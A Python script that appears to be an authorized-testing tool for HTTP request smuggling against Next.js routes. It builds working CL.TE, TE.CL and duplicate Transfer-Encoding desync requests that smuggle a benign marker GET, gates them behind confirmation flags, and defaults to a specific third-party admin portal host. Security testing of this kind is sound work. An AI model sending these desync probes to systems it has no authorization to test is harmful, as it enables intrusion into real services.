#!/usr/bin/env python3
"""
Next.js request smuggling tester for authorized environments.

Safe mode:
- sends normal OPTIONS/DELETE and well-formed zero-length chunked requests.

Intrusive mode:
- requires --enable-intrusive and --confirm-host <host>,
- sends CL.TE / TE.CL style desync probes with a harmless GET marker as the
  potential smuggled request,
- does not target admin/internal paths unless you explicitly pass them.

Use intrusive mode only during an approved test window.
"""

from __future__ import annotations

import argparse
import json
import socket
import ssl
import time
import urllib.parse


DEFAULT_ROUTES = [
    "/",
    "/snap",
    "/pwt",
    "/data-platform",
    "/data-platform/sigma-api",
    "/en/data-platform/sigma-api",
    "/fr/data-platform/sigma-api",
]


def parse_base(base: str):
    parsed = urllib.parse.urlparse(base)
    if parsed.scheme not in ("http", "https") or not parsed.hostname:
        raise SystemExit("--base must be an absolute http(s) URL")
    return parsed


def open_socket(parsed, timeout: int, insecure: bool):
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    raw = socket.create_connection((parsed.hostname, port), timeout=timeout)
    if parsed.scheme == "https":
        ctx = ssl.create_default_context()
        if insecure:
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        return ctx.wrap_socket(raw, server_hostname=parsed.hostname)
    return raw


def read_response(sock, timeout: int, limit: int = 120_000):
    sock.settimeout(timeout)
    chunks = []
    total = 0
    try:
        while total < limit:
            data = sock.recv(min(8192, limit - total))
            if not data:
                break
            chunks.append(data)
            total += len(data)
            if b"\r\n0\r\n\r\n" in b"".join(chunks[-3:]):
                break
            if b"</html>" in b"".join(chunks[-3:]).lower():
                break
    except socket.timeout:
        pass
    raw = b"".join(chunks)
    text = raw.decode("utf-8", errors="replace")
    status = None
    first = text.splitlines()[0] if text.splitlines() else ""
    parts = first.split()
    if len(parts) >= 2 and parts[1].isdigit():
        status = int(parts[1])
    return {
        "status": status,
        "first_line": first,
        "response_len": len(raw),
        "response_preview": text[:800],
        "saw_multiple_http_responses": text.count("HTTP/1.") > 1,
        "timeout_or_partial": len(raw) == 0 or not text.endswith(("\r\n", "\n", ">")),
    }


def send_raw(parsed, raw_request: bytes, timeout: int, insecure: bool):
    sock = None
    try:
        sock = open_socket(parsed, timeout, insecure)
        sock.sendall(raw_request)
        return read_response(sock, timeout)
    except Exception as exc:
        return {
            "status": None,
            "first_line": "",
            "response_len": 0,
            "response_preview": "",
            "saw_multiple_http_responses": False,
            "timeout_or_partial": False,
            "error": f"{type(exc).__name__}: {exc}",
        }
    finally:
        try:
            if sock:
                sock.close()
        except Exception:
            pass


def host_header(parsed):
    port = parsed.port
    if port and not ((parsed.scheme == "https" and port == 443) or (parsed.scheme == "http" and port == 80)):
        return f"{parsed.hostname}:{port}"
    return parsed.hostname


def normal_request(method: str, path: str, host: str):
    return (
        f"{method} {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "User-Agent: authorized-nextjs-smuggling-tester/1.0\r\n"
        "Accept: */*\r\n"
        "Connection: close\r\n"
        "\r\n"
    ).encode()


def chunked_zero_request(method: str, path: str, host: str):
    return (
        f"{method} {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "User-Agent: authorized-nextjs-smuggling-tester/1.0\r\n"
        "Accept: */*\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Connection: close\r\n"
        "\r\n"
        "0\r\n\r\n"
    ).encode()


def smuggled_get(marker_path: str, host: str, marker: str):
    return (
        f"GET {marker_path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"X-Smuggle-Probe: {marker}\r\n"
        "Connection: close\r\n"
        "\r\n"
    )


def cl_te_request(method: str, path: str, host: str, marker_path: str, marker: str):
    smuggled = smuggled_get(marker_path, host, marker)
    body = "0\r\n\r\n" + smuggled
    # Frontend/backends that disagree on CL vs TE may treat the GET differently.
    return (
        f"{method} {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "User-Agent: authorized-nextjs-smuggling-tester/1.0\r\n"
        "Accept: */*\r\n"
        "Content-Length: 4\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Connection: keep-alive\r\n"
        "\r\n"
        + body
    ).encode()


def te_cl_request(method: str, path: str, host: str, marker_path: str, marker: str):
    smuggled = smuggled_get(marker_path, host, marker)
    body = "0\r\n\r\n" + smuggled
    return (
        f"{method} {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "User-Agent: authorized-nextjs-smuggling-tester/1.0\r\n"
        "Accept: */*\r\n"
        f"Content-Length: {len(body)}\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Connection: keep-alive\r\n"
        "\r\n"
        + body
    ).encode()


def duplicate_te_request(method: str, path: str, host: str, marker_path: str, marker: str):
    smuggled = smuggled_get(marker_path, host, marker)
    body = "0\r\n\r\n" + smuggled
    return (
        f"{method} {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "User-Agent: authorized-nextjs-smuggling-tester/1.0\r\n"
        "Accept: */*\r\n"
        f"Content-Length: {len(body)}\r\n"
        "Transfer-Encoding: xchunked\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Connection: keep-alive\r\n"
        "\r\n"
        + body
    ).encode()


def main():
    parser = argparse.ArgumentParser(description="Next.js request smuggling tester")
    parser.add_argument("--base", default="https://uat.adminportal.airmiles.ca")
    parser.add_argument("--route", action="append", default=[])
    parser.add_argument("--marker-path", default="")
    parser.add_argument("--timeout", type=int, default=8)
    parser.add_argument("--delay", type=float, default=0.25)
    parser.add_argument("--enable-intrusive", action="store_true")
    parser.add_argument("--confirm-host", default="", help="Must equal target host to enable intrusive mode.")
    parser.add_argument("--out", default="work/nextjs_request_smuggling_results.json")
    parser.add_argument("--insecure", action="store_true")
    args = parser.parse_args()

    parsed = parse_base(args.base)
    host = host_header(parsed)
    routes = []
    for route in DEFAULT_ROUTES + args.route:
        if route not in routes:
            routes.append(route)
    marker = "codexsmuggle" + str(int(time.time()))
    marker_path = args.marker_path or f"/__codex_smuggle_marker_{marker}"

    intrusive_enabled = args.enable_intrusive and args.confirm_host == parsed.hostname
    if args.enable_intrusive and not intrusive_enabled:
        raise SystemExit("--confirm-host must exactly match target hostname to enable intrusive mode")

    results = []
    for route in routes:
        for method in ["OPTIONS", "DELETE"]:
            safe_cases = [
                ("normal", normal_request(method, route, host)),
                ("well_formed_chunked_zero", chunked_zero_request(method, route, host)),
            ]
            for name, raw in safe_cases:
                resp = send_raw(parsed, raw, args.timeout, args.insecure)
                results.append({"route": route, "method": method, "case": name, "intrusive": False, "response": resp})
                time.sleep(args.delay)

            if intrusive_enabled:
                intrusive_cases = [
                    ("cl_te", cl_te_request(method, route, host, marker_path, marker)),
                    ("te_cl", te_cl_request(method, route, host, marker_path, marker)),
                    ("duplicate_te", duplicate_te_request(method, route, host, marker_path, marker)),
                ]
                for name, raw in intrusive_cases:
                    resp = send_raw(parsed, raw, args.timeout, args.insecure)
                    results.append(
                        {
                            "route": route,
                            "method": method,
                            "case": name,
                            "intrusive": True,
                            "marker_path": marker_path,
                            "response": resp,
                        }
                    )
                    time.sleep(args.delay)

    anomalies = [
        item
        for item in results
        if item["response"].get("saw_multiple_http_responses")
        or item["response"].get("timeout_or_partial")
        or item["response"].get("error")
    ]
    output = {
        "target": args.base,
        "timestamp_utc": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "intrusive_enabled": intrusive_enabled,
        "marker": marker,
        "marker_path": marker_path,
        "routes_tested": routes,
        "results": results,
        "anomaly_count": len(anomalies),
        "anomalies": anomalies,
        "manual_log_note": "For intrusive mode, check backend/access logs for X-Smuggle-Probe or marker_path.",
    }
    with open(args.out, "w", encoding="utf-8") as handle:
        json.dump(output, handle, indent=2)
    print(json.dumps({"out": args.out, "intrusive_enabled": intrusive_enabled, "marker_path": marker_path, "anomaly_count": len(anomalies)}, indent=2))


if __name__ == "__main__":
    main()
